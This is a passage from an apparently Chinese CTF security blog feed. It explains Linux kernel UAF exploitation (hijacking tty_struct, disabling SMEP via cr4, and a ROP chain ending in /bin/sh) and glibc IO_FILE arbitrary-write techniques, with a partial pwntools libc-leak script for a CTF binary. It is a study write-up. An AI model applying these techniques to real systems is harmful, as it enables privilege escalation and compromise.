class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// control never reaches here</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/01/31/kernel-3-UAF/image-20220131140225163.png" alt="image-20220131140225163"></p><h2 id="思路-劫持tty结构体"><a href="#思路-劫持tty结构体" class="headerlink" title="思路-劫持tty结构体"></a>思路-劫持tty结构体</h2><p>基本的漏洞点还是UAF，但是除了劫持cred结构体，这里还有一个新的思路就是劫持tty结构体。这里主要参考<a href="https://www.anquanke.com/post/id/259252">安全客</a>关于tty和cred结构体的解释和利用方法，结合<a href="http://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html">这位师傅的博客</a>以及<a href="https://xz.aliyun.com/t/5847">这篇文章</a>学习的。事实上，在linux4.5之后，cred的结构体内存和一般程序分配的内存将被分开储存，因此用户不会直接分配得到该结构，从而cred复用的这一条路就被堵死了。</p><p>这里给出一个新思路：劫持tty设备的函数指针</p><blockquote><p>在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code>。这个设备的执行过程可以大致描述为：telnetd进程收到网络中的数据后，将数据丢给ptmx，ptmx像管道一样将数据丢给pts/?，getty进程从pts/?读取数据传递给shell去执行。(参考<a href="https://blog.csdn.net/luckywang1103/article/details/71191821">这篇文章:ptmx</a>)</p></blockquote><p>注意到tty_struct也是kmalloc申请出来的一段内存。分配过程如下。<strong>其中tty_struct大小为0x2e0</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> tty_struct *<span class="title function_">alloc_tty_struct</span><span class="params">(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"></span><br><span class="line">    tty = kzalloc(<span class="keyword">sizeof</span>(*tty), GFP_KERNEL); <span class="comment">// 分配发生，size = 0x2e0。就是包了一层kmalloc</span></span><br><span class="line">    <span class="keyword">if</span> (!tty)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 此处省略对tty的初始化工作</span></span><br><span class="line">    <span class="keyword">return</span> tty;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中tty_struct结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// **********重要**********</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>     <span class="comment">// tty_operations结构体</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>注意到其中的operations结构体非常重要。他其实是一系列函数指针，如下所示。(也可以理解为就是tty操纵一些文件的方式)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>那么，劫持这个<code>tty_operations</code>结构体，就可能可以实现控制执行流。注意这个<strong>栈的ROP链存在于用户栈上</strong>，由于内核没有开启<code>SMAP</code>保护，故<strong>内核可以访问用户空间的数据</strong>（SMEP保护是禁止内核执行用户空间的代码，这里开启了，所以不能执行用户空间代码）这一部分内容后面补上。</p><h3 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h3><p>之前说到smep保护，那么内核是怎么知道smep开启的？答案在cr4寄存器也就是和pcb紧密相关的进程控制寄存器中。</p><p><img src="/2022/01/31/kernel-3-UAF/cr4.png" alt="cr4"></p><p>第20位记录了是否开启smep。1时标志保护开启，0时表示保护关闭。通过以下代码可以修改cr4寄存器的值。注意: 该寄存器的值无法通过gdb直接查看，只能通过kernel crash时产生的信息查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cr4,0x6f0 ;   0000 0000 0110 1111 0000</span><br></pre></td></tr></table></figure><p>我们可以通过劫持tty_struct中write函数实现getshell。下面简单写一下思路。</p><ol><li>UAF得到一个和tty结构体一样大的dangling指针，使得后续可以UAF</li><li>修改指针中的数据(尤其是<code>tty_struct</code>中<code>tty_operation</code>中write)为我们的ROP chain(该chain所做的工作主要是替换cr0寄存器smep位置，之后执行system即可。)</li><li>调用/dev/tty触发write的ROP。</li></ol><p>但是ROP的前提是我们能控制到栈，在write的时候是没法写栈的，一般而言要通过类似<code>xchg rax, rsp</code>来修改rsp从而控制栈。我们调试一下在调用babyread时候的栈。使用以下代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./babydriver.ko 0xffffffffc0000000 # z</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/86490">https://www.anquanke.com/post/id/86490</a></p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/#ciscn2017-babydriver">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/#ciscn2017-babydriver</a></p><p><a href="https://www.anquanke.com/post/id/259252">https://www.anquanke.com/post/id/259252</a></p><p><a href="https://xz.aliyun.com/t/5847">https://xz.aliyun.com/t/5847</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_file常见利用方法&amp;原理(一)</title>
      <link href="/2022/01/29/IO-file/"/>
      <url>/2022/01/29/IO-file/</url>
      
        <content type="html"><![CDATA[<p>记录一下IO_FILE的学习。之前都是零散的看到题目做题，不会了复现别人的做法。现在把新旧版本的IO_FILE利用方法整合一下。本篇文章主要关注 劫持IO_FILE任意读写(泄露libc、任意写)</p><span id="more"></span><h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h1><p>IO_FILE应该算是比较重要的一种攻击。和堆、栈不同，IO_FILE攻击的是打开文件/关闭文件的操作。由于ctf题目往往会关闭至少是二进制文件(return、exit等都会关闭文件)因此IO_FILE的触发可以说是必然的。同时，在高版本libc中，没有了hook函数，往往也就是利用IO_FILE完成攻击。此外，对于stdin和stdout的操作还能控制程序任意读写内存。</p><h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><ol><li><p>劫持IO_FILE任意读写(泄露libc、任意写)</p></li><li><p>劫持chain字段：house of orange(FSOP)</p></li><li><p>house of pig</p></li><li><p>exit_hook</p></li></ol><h2 id="stdin任意地址写"><a href="#stdin任意地址写" class="headerlink" title="stdin任意地址写"></a>stdin任意地址写</h2><p>参考的是<a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write%E9%99%84%E4%BB%B6%E4%B9%9F%E5%9C%A8%E8%BF%99%E4%BD%8D%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2%E4%B8%AD">https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write附件也在这位师傅博客中</a></p><p>在linux中，内核会为文件分配输入输出指针。如下所示。</p><p><img src="/2022/01/29/IO-file/image-20220129213644246.png" alt="image-20220129213644246"></p><p>read_base和read_end表示读取的开始和结尾，read_ptr表示读取的当前位置。注意到这里三者都是相等的，为什么呢？因为程序一开始的setvbuf所做的就是设置输入输出缓冲区。一旦设置为0，那么base和end就会相等，每一次的输入输出，就不会被缓冲。</p><blockquote><p>如果能够修改stdin的write_base的位置，是否就能任意地址写，同样的，修改stdout的read_base位置，是否就能实现任意地址读呢？答案是肯定的。</p></blockquote><p>按照ray-cp师傅的博客，简单分析一下源码</p><p>在<code>fread</code>源码中，首先调用如下函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line"> ...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">//输入缓冲区为空则初始化输入缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (have &gt; <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">          ...</span><br><span class="line">          <span class="comment">//memcpy</span></span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">          &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__underflow (fp) == EOF)  <span class="comment">// 调用__underflow读入数据</span></span><br><span class="line">      ...</span><br><span class="line">        &#125;</span><br><span class="line">      ...</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到fread首先判断缓冲区<code>_IO_buf_base</code>是否为空，如果是就调用<code>_IO_doallocbuf</code>初始化缓冲区。接着拿到want，也就是我们想要写入的字符数量，和have，我们剩余的缓冲区作比较（这里个人感觉类似linux管道）如果还有没写完的，就调用<code>memcopy</code>否则说明缓冲区内的数据不够，那么调用<code>__underflow</code>读入数据到缓冲区，再复制。</p><p>这里我们看到，最好设置<code>_IO_read_end -_IO_read_ptr =0</code>，这样能够实现立即写。</p><p>再来看看<code>__IO_underflow</code>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 如果存在_IO_NO_READS标志，则直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 如果输入缓冲区里存在数据，则直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用_IO_SYSREAD函数最终执行系统调用读取数据</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>underflow的目的是读取数据。首先检查目标文件是否可读，也就是与上标志为。在linux中，这个标志位的值是4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define _IO_NO_READS <span class="number">4</span></span><br></pre></td></tr></table></figure><p>因此我们要确保<code>fp-&gt;flags&amp;4==0</code>也就是文件可读。</p><p>接着如果想调用<code>_IO_SYSREAD</code>真正调用输入，需要确保绕过前面的if检验。由于之前已经设置<code>_IO_read_end -_IO_read_ptr =0</code>这里可以直接到系统调用。</p><p>注意这里系统调用的参数：<code>IO_buf_base</code>需要设置为<code>write_start</code>，<code>IO_buf_end</code>为<code>write_end</code>。并且要求<code>_IO_buf_end-_IO_buf_base</code>大于fread要读的数据数量。并且<code>_fileno</code>=0，表示标准输入。</p><p>总结一下要求</p><blockquote><ol><li><p>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</p></li><li><p>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>。</p></li><li><p>设置<code>_fileno</code>为0。</p></li><li><p>设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>；且使得<code>_IO_buf_end-_IO_buf_base</code>大于fread要读的数据</p></li></ol></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>例子是whctf2017的stackoverflow</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  whctf2018-stkof checksec ./stackoverflow</span><br><span class="line">[*]</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看到有canary保护。</p><p>输入name地方如下。直接尝试输入0x50字符是泄露不出来的，这里是因为<strong>没有经过初始化，栈上有有用数据</strong>完成的泄露(我还是太菜了，这都没想到)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;leave your name, bro:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x07dd52</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>主函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">main_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span 